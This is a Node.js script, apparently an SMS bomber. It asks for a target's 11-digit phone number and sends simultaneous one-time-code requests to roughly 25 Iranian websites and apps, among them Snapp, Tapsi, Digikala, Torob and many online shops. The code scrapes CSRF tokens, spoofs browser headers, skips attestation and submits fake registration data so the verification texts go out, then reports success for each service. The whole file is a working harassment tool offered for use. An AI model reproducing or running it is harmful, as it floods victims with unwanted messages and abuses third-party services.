import { api } from "./src/api.js";
import { v4 as uuidV4 } from "uuid";
import { randomBytes, randomInt } from "crypto";
import { load } from "cheerio";
import readline from "readline";
import { readFileSync } from "fs";

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

function generateUUIDv4() {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
    const r = (Math.random() * 16) | 0;
    const v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

/**
 *
 * @param {string} phoneNumber
 */
const requests = async (phoneNumber) => {
  const str = () => {
    const raw = randomBytes(10).toString("base64");
    const filtered = raw.replace(/[^a-zA-Z]/g, "");

    return filtered;
  };

  const options = {
    shixon: {
      body: async () => {
        const response = await fetch("https://shixon.com");

        const text = await response.text();

        const $ = load(text);

        const token = $(`input[name="__RequestVerificationToken"]`).val();

        const formData = new URLSearchParams();
        formData.append("M", phoneNumber);
        formData.append("__RequestVerificationToken", token);
        formData.append("P", randomInt(10));
        formData.append("S", 888);
        formData.append("PU", "");

        return formData;
      },
    },
    tagmond: {
      body: async () => {
        const response = await fetch("https://tagmond.com");

        const text = await response.text();

        const $ = load(text);

        const recaptcha = $(`input[name="recaptcha"]`).val();

        const formData = new URLSearchParams();

        formData.append("utf8", "%E2%9C%93");
        formData.append("custom_comment_body_hp_24124", "");
        formData.append("phone_number", phoneNumber);
        formData.append("recaptcha", recaptcha);

        return formData;
      },
    },
    webpoosh: {
      body: async () => {
        const response = await fetch("https://webpoosh.com");

        const text = await response.text();

        const $ = load(text);

        const csrfToken = $(`meta[name="csrf-token"]`)
          .attr("content")
          .toString();

        const formData = new URLSearchParams();

        formData.append("_token", csrfToken);
        formData.append("cellphone", phoneNumber);

        return formData;
      },
    },
    ibolak: {
      body: async () => {
        const response = await fetch("https://ibolak.com");

        const text = await response.text();

        const $ = load(text);

        const csrfToken = $(`meta[name="csrf-token"]`)
          .attr("content")
          .toString();

        const formData = new URLSearchParams();

        formData.append("mobile", phoneNumber);
        formData.append("redirect_url", "https://ibolak.com/panel/dashboard");
        formData.append("_token", csrfToken);

        return formData;
      },
    },
    sensishopping: {
      body: async () => {
        const response = await fetch("https://sensishopping.com?login=true");

        const text = await response.text();

        const $ = load(text);

        const csrfToken = $(`input[name="dig_nounce"]`).val();

        const formData = new URLSearchParams();

        const num = phoneNumber.toString().slice(1);

        formData.append("action", "digits_check_mob");
        formData.append("countrycode", "+98");
        formData.append("mobileNo", phoneNumber.slice(1));
        formData.append("csrf", csrfToken);
        formData.append("login", 1);
        formData.append("username", "");
        formData.append("email", "");
        formData.append("captcha", "");
        formData.append("captcha_ses", "");
        formData.append("digits", 1);
        formData.append("json", 1);
        formData.append("whatsapp", 0);
        formData.append(
          "mobmail",
          `${num.slice(0, 3)} ${num.slice(3, 6)} ${num.slice(6)}`
        );
        formData.append("dig_otp", "");
        formData.append("dig_nounce", csrfToken);

        return formData;
      },
    },
    modiseh: {
      body: async () => {
        const response = await fetch("https://modiseh.com");

        const text = await response.text();

        const $ = load(text);

        const formKey = $(`input[name="form_key"]`).val();
        const refererId = $(`form[name="loginForm"]`)
          .attr("action")
          .split("referer/")[1]
          .replace(/\/$/, "");

        const formData = new URLSearchParams();

        formData.append("otp_code", "");
        formData.append("login[username]", "");
        formData.append("username", phoneNumber);
        formData.append("pass", "");
        formData.append("my_pass", "");
        formData.append("is_force_login", "");
        formData.append("customer_set_password", "");
        formData.append("customer_set_password2", "");
        formData.append("form_key", formKey);
        formData.append("type", "enter_mobile");
        formData.append("captcha[user_login]", "123456");
        formData.append("referer", refererId);

        return formData;
      },
    },
    bornosmode: {
      body: () => {
        const formData = new URLSearchParams();

        formData.append("mobile", phoneNumber);
        formData.append("withOtp", 1);

        return formData;
      },
      csrfToken: async () => {
        const response = await fetch("https://bornosmode.com/");

        const text = await response.text();

        const $ = load(text);

        const formKey = $(`meta[name="csrf-token"]`).attr("content").toString();

        return formKey;
      },
    },
    piccotoys: {
      body: () => {
        const formData = new URLSearchParams();
        formData.append("user_mobile", phoneNumber);
        formData.append("confirm_code", "");

        return formData;
      },
    },
    bazi_to: {
      body: async () => {
        const response = await fetch("https://bazi-to.com/auth");

        const text = await response.text();

        const $ = load(text);

        const script = $(`script[id="voorodak-script-js-extra"]`).html();

        const match = script.match(/"security":"(.*?)"/);
        const securityToken = match ? match[1] : null;

        const formData = new URLSearchParams();

        formData.append("action", "voorodak__submit-username");
        formData.append("username", phoneNumber);
        formData.append("security", securityToken);

        return formData;
      },
    },
    bazimoz: {
      body: async () => {
        const response = await fetch("https://bazimoz.com");

        const text = await response.text();

        const $ = load(text);

        const token = $('input[name="__RequestVerificationToken"]').val();

        const formData = new URLSearchParams();
        formData.append("Input.FullName", "sdfjksjkfkjskjfskj");
        formData.append("Input.Mobile", phoneNumber);
        formData.append("Input.Password", randomBytes(10).toString("hex"));
        formData.append("Input.AcceptTerms", true);
        formData.append("__RequestVerificationToken", token);
        formData.append("Input.AcceptTerms", false);

        return formData;
      },
    },
    tehtoy: {
      body: () => {
        const formData = new URLSearchParams();

        formData.append("action", "stm_login_register");
        formData.append("type", "mobile");
        formData.append("input", phoneNumber);

        return formData;
      },
    },
    vizzzzz: {
      body: async () => {
        const response = await fetch("https://bazi-to.com/auth");

        const text = await response.text();

        const $ = load(text);

        const script = $(`script[id="digits-login-script-js-extra"]`).html();

        const match = script.match(/"nonce":"(.*?)"/);
        const securityToken = match ? match[1] : null;

        const formData = new URLSearchParams();

        formData.append("action", "digits_check_mob");
        formData.append("countrycode", "+98");
        formData.append("mobileNo", phoneNumber);
        formData.append("csrf", securityToken);
        formData.append("login", 2);
        formData.append("username", str());
        formData.append("email", `${str().toLowerCase()}@gmail.com`);
        formData.append("captcha", "");
        formData.append("captcha_ses", "");
        formData.append("json", 1);
        formData.append("whatsapp", 0);

        return formData;
      },
    },
    pubg_sell: {
      body: () => {
        const formData = new URLSearchParams();

        formData.append("username", phoneNumber);

        return phoneNumber;
      },
      token: async () => {
        const response = await fetch("https://pubg-sell.ir");

        const text = await response.text();

        const $ = load(text);

        const token = $('meta[name="csrf-token"]').attr("content");

        return token;
      },
    },
  };

  const formatPhoneNumber = () => {
    const num = phoneNumber.toString().slice(1);
    return `${num.slice(0, 3)} ${num.slice(3, 6)} ${num.slice(6)}`;
  };

  return [
    api.post(
      "https://api.snapp.ir/api/v1/sms/link",
      { phone: phoneNumber },
      {
        headers: {
          accept: "*/*",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "content-type": "application/json",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-site",
          referrer: "https://snapp.ir/",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post(
      "https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp",
      {
        cellphone: `+98${phoneNumber.slice(1)}`,
        attestation: { method: "skip", platform: "skip" },
        extra_methods: [],
      },
      {
        headers: {
          accept: "*/*",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "app-version": "pwa",
          "content-type": "application/json",
          locale: "fa-IR",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "x-app-name": "passenger-pwa",
          "x-app-version": "v18.20.0",
          referrer: "https://app.snapp.taxi/login",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post(
      "https://accounts-api.tapsi.ir/api/v1/sso-user/auth",
      {
        session_id: `${uuidV4()}--${uuidV4()}`,
        selected_step_key: "PROMPT_FOR_SMS_CODE",
        phone_number: phoneNumber,
      },
      {
        headers: {
          accept: "*/*",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          baggage:
            "sentry-environment=production,sentry-release=-WD_l2WaRn2efqXZSdcfi,sentry-public_key=6fcdd851e5d849d7a65e9c87fb5e1566,sentry-trace_id=9847c388dc8b4c89a983aa9058cdb173,sentry-sample_rate=1,sentry-transaction=%2Fconfirm%2F%5BphoneNumber%5D,sentry-sampled=true",
          "content-type": "application/json",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Android"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-site",
          //   "sentry-trace": "9847c388dc8b4c89a983aa9058cdb173-ae8875a70f93194c-1",
          "x-agent": "v2.2|accounts|WEB|1.0.0||10|||||||||||||||",
          //   cookie:
          // "_ga=GA1.2.280874602.1745511080; _gid=GA1.2.424871515.1745511080; _clck=jdc60%7C2%7Cfvc%7C0%7C1940; _clsk=1rsenau%7C1745511113356%7C1%7C1%7Cw.clarity.ms%2Fcollect; __arcsco=e44a5fb7aa4e69f0ae0e86294f3b58f4",
          Referer: "https://accounts.tapsi.ir/",
          "Referrer-Policy": "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post(
      "https://api.digikala.com/v1/user/authenticate/",
      {
        backUrl: "/",
        username: phoneNumber,
        otp_call: false,
        hash: null,
      },
      {
        headers: {
          accept: "application/json, text/plain, */*",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "content-type": "application/json",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-site",
          "x-web-client": "desktop",
          "x-web-optimize-response": "1",
          referrer: "https://www.digikala.com/",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post(
      "https://padmira.ir/ajax/send_sms_active",
      new URLSearchParams().append("mobile", phoneNumber),
      {
        headers: {
          accept: "*/*",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "x-csrf-token": "6ydTaTWgReyoQM8k0VbswlTMDsAQLpWXvAJeyzX9",
          "x-requested-with": "XMLHttpRequest",
          referrer: "https://padmira.ir/user/login",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post(
      "https://www.shixon.com/Home/RegisterUser",
      await options.shixon.body(),
      {
        headers: {
          accept: "text/html, */*; q=0.01",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "x-requested-with": "XMLHttpRequest",
          referrer: "https://www.shixon.com/",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post("https://tagmond.com/phone_number", await options.tagmond.body(), {
      headers: {
        accept:
          "*/*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript",
        "accept-language": "en-US,en;q=0.9,fa;q=0.8",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "sec-ch-ua":
          '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-csrf-token":
          "aQ7yqNfSJPxntFujrGd+DmL4NMP7bMm/OgSULVBxnKGdv4bSTUkDBZJrGTs2kMQoPfJYad0RUwh+a9lyTOsuUg==",
        "x-requested-with": "XMLHttpRequest",
        referrer: "https://tagmond.com/",
        referrerPolicy: "strict-origin-when-cross-origin",
      },
      withCredentials: true,
    }),
    api.post(
      "https://mobapi.banimode.com/api/v2/auth/request",
      { phone: phoneNumber },
      {
        headers: {
          accept: "application/json, text/plain, */*",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "content-type": "application/json;charset=UTF-8",
          platform: "desktop",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-site",
          referrer: "https://www.banimode.com/",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post(
      "https://www.webpoosh.com/register",
      await options.webpoosh.body(),
      {
        headers: {
          accept: "*/*",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "x-requested-with": "XMLHttpRequest",
          referrer: "https://www.webpoosh.com/",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post(
      "https://ibolak.com/api/v1/auth/send-register-code",
      await options.ibolak.body(),
      {
        headers: {
          accept: "*/*",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "x-requested-with": "XMLHttpRequest",
          cookie:
            "analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=a238e1f6-e029-c9ae-e9d1-de352ca29eac; analytics_session_token=ba73bbfa-7078-db60-4254-455762dae1d7; yektanet_session_last_activity=4/24/2025; _yngt_iframe=1; _yngt=01JJVNSNF7W8JZGCSXE14SQGMP; _ga=GA1.1.674332473.1745518122; _ga_M2EMGCFBNY=GS1.1.1745518121.1.0.1745518121.0.0.0; XSRF-TOKEN=eyJpdiI6Im0xQkdqb0xhZ0IxbTc3Q25sZ0FQa1E9PSIsInZhbHVlIjoiQ3IyK0pPdmNoTE1DMSttbmRRVnBabG5uMzQzN3k1ZUxwaDZtK1NEY3UzNU1XNEN3a2M3anBSL3VOUnVrbVR2M0NGUHJXa1l3cVUva2ZhVW95S0dCb0l1Si94OTZDcHZlODRnTEdsMXNHbmxsVXJwbWdlRnhDT0JacXlyTjQ0N0IiLCJtYWMiOiJkYWVmNWQxZmUwNWIzYjdkZTk4ZjRkZmE3MmM3YTNiNWMyM2MzNzY1MTNjYTdjNmYwZDQwYzlhZjUzMTQwYjJhIiwidGFnIjoiIn0%3D; avo_session=eyJpdiI6IjRXUjIvbXNURUNEeHNOQ08vMk01dVE9PSIsInZhbHVlIjoiYmZQV3duZW90b2FLaDZnVTNmU2xZTjVLUHcxa1dpQ1dYZEdlWHBtbWdISzFoS1gxcXptdDV4eEdGSGE3TmtmNFNnWFJ1dTArN0M3MkNUWTFmTjFnQnliYitUayt4ZDdudTVoRFZJUzcxdXhROG5PdW1GVUw1SFVkc2VoRW5abEoiLCJtYWMiOiIzMGEzYTA0N2VlM2ViMWU5Y2YwNzVmYzI0NTQwZGU3ZTllZTE2ZWM2MDJlNDUyMjBlNDBjNmVjZjVhMTU0NzM0IiwidGFnIjoiIn0%3D",
          Referer:
            "https://ibolak.com/login?redirect_url=aHR0cHM6Ly9pYm9sYWsuY29tL3BhbmVsL2Rhc2hib2FyZA%3D%3D",
          "Referrer-Policy": "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post(
      "https://sensishopping.com/wp-admin/admin-ajax.php",
      await options.sensishopping.body(),
      {
        headers: {
          accept: "*/*",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "x-requested-with": "XMLHttpRequest",
          referrer:
            "https://sensishopping.com/?login=true&page=1&redirect_to=https%3A%2F%2Fsensishopping.com%2F",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post(
      "https://auth.basalam.com/captcha/otp-request",
      {
        mobile: phoneNumber,
        client_id: 11,
      },
      {
        headers: {
          accept: "application/json, text/plain, */*",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "content-type": "application/json",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-site",
          "x-client-info": `{"version":"2.11.1","project":"charsou","name":"web.public","platform":"web","deviceId":${generateUUIDv4()},"sessionId":${uuidV4()}}`,
          "x-creation-tags":
            '{"client":"customer-charsou","os":"windows","uri":"%2Fcat%2Fapparel%2F%D9%84%D8%A8%D8%A7%D8%B3-%D9%BE%D9%88%D8%B4%D8%A7%DA%A9-%D8%B2%D9%86%D8%A7%D9%86%D9%87","fullPath":"https%3A%2F%2Fbasalam.com%2Fcat%2Fapparel%2F%D9%84%D8%A8%D8%A7%D8%B3-%D9%BE%D9%88%D8%B4%D8%A7%DA%A9-%D8%B2%D9%86%D8%A7%D9%86%D9%87","device":"desktop","app":"web"}',
          referrer: "https://basalam.com/",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post(
      "https://www.modiseh.com/customer/account/loginpost",
      await options.modiseh.body(),
      {
        headers: {
          accept: "*/*",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "x-requested-with": "XMLHttpRequest",
          referrer:
            "https://www.modiseh.com/customer/account/login/referer/aHR0cHM6Ly93d3cubW9kaXNlaC5jb20v/",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post(
      "https://api.aysoocollection.com/api/sendcode",
      {
        mobile: phoneNumber,
        active_code: "",
        fullname: "",
      },
      {
        headers: {
          accept: "application/json, text/plain, */*",
          "content-type": "application/json",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          referrer: "https://aysoocollection.com/",
        },
      }
    ),
    api.post(
      "https://bornosmode.com/api/loginRegister",
      options.bornosmode.body(),
      {
        headers: {
          accept: "*/*",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "x-csrf-token": await options.bornosmode.csrfToken(),
          "x-requested-with": "XMLHttpRequest",
          referrer:
            "https://bornosmode.com/login/?_back=https%3A%2F%2Fbornosmode.com%2F",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post("https://piccotoys.com/signin?do", options.piccotoys.body(), {
      headers: {
        accept: "*/*",
        "accept-language": "en-US,en;q=0.9,fa;q=0.8",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        priority: "u=1, i",
        "sec-ch-ua":
          '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-requested-with": "XMLHttpRequest",
        referrer: "https://piccotoys.com/signin",
        referrerPolicy: "strict-origin-when-cross-origin",
      },
    }),
    api.post(
      "https://bazi-to.com/wp-admin/admin-ajax.php",
      await options.bazi_to.body(),
      {
        headers: {
          accept: "application/json, text/javascript, */*; q=0.01",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "x-requested-with": "XMLHttpRequest",
          referrer: "https://bazi-to.com/auth/",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post(
      "https://www.bazimoz.com/Account/Register?returnUrl=%2F",
      await options.bazimoz.body(),
      {
        headers: {
          accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "cache-control": "max-age=0",
          "content-type": "application/x-www-form-urlencoded",
          priority: "u=0, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "document",
          "sec-fetch-mode": "navigate",
          "sec-fetch-site": "same-origin",
          "sec-fetch-user": "?1",
          "upgrade-insecure-requests": "1",
          referrer: "https://www.bazimoz.com/",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.get(
      `https://api.torob.com/v4/user/phone/send-pin/?phone_number=${phoneNumber}&_http_referrer=https%3A%2F%2Fwww.google.com%2F&source=next_desktop`,
      {
        headers: {
          accept: "*/*",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-site",
          referrer: "https://torob.com/",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post(
      "https://tehtoy.com/wp-admin/admin-ajax.php",
      options.tehtoy.body(),
      {
        headers: {
          accept: "application/json, text/javascript, */*; q=0.01",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "x-requested-with": "XMLHttpRequest",
          referrer: "https://tehtoy.com/",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post(
      "https://baradarantoy.ir/sendconfirmsmsajax.php",
      new URLSearchParams().append("user_tel", phoneNumber),
      {
        headers: {
          accept: "*/*",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "x-requested-with": "XMLHttpRequest",
          referrer: "https://baradarantoy.ir/fa/",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post(
      "https://vizzzzz.com/wp-admin/admin-ajax.php",
      await options.vizzzzz.body(),
      {
        headers: {
          accept: "*/*",
          "accept-language": "en-US,en;q=0.9,fa;q=0.8",
          "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
          priority: "u=1, i",
          "sec-ch-ua":
            '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "x-requested-with": "XMLHttpRequest",
          referrer: "https://vizzzzz.com/my-account/",
          referrerPolicy: "strict-origin-when-cross-origin",
        },
      }
    ),
    api.post("https://pubg-sell.ir/loginuser", options.pubg_sell.body(), {
      headers: {
        accept: "*/*",
        "accept-language": "en-US,en;q=0.9,fa;q=0.8",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "sec-ch-ua":
          '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-csrf-token": await options.pubg_sell.token(),
        "x-requested-with": "XMLHttpRequest",
        referrer: "https://pubg-sell.ir/login",
        referrerPolicy: "strict-origin-when-cross-origin",
      },
    }),
  ];
};

async function run() {
  try {
    console.log(readFileSync("./index.txt", "utf-8"));

    rl.question("Enter phone number (11 digits): ", async (phoneNumber) => {
      try {
        if (/^\d{11}$/.test(phoneNumber)) {
          const promises = await requests(phoneNumber);
          const responses = await Promise.all(promises);

          responses.forEach((res) => {
            if (res.status === 200) {
              console.log("\x1b[32m✓ Success! Status: 200\x1b[0m");
            } else {
              console.log(`\x1b[31m✖ Error! Status: ${res.status}\x1b[0m`);
            }
          });

          console.log("\x1b[32m💚 Finish\x1b[0m");
        } else {
          console.log(
            "\x1b[33m⚠️ Invalid phone number. Please enter exactly 11 digits.\x1b[0m"
          );
        }
      } catch (error) {
        console.error(
          "\x1b[31m✖ Error during request execution: ",
          error.message,
          "\x1b[0m"
        );
      } finally {
        console.log("\x1b[32m💚 Finish\x1b[0m");
        rl.close();
      }
    });
  } catch (error) {
    console.error(
      "\x1b[31m✖ Error reading the file: ",
      error.message,
      "\x1b[0m"
    );
    rl.close();
  }
}

run();
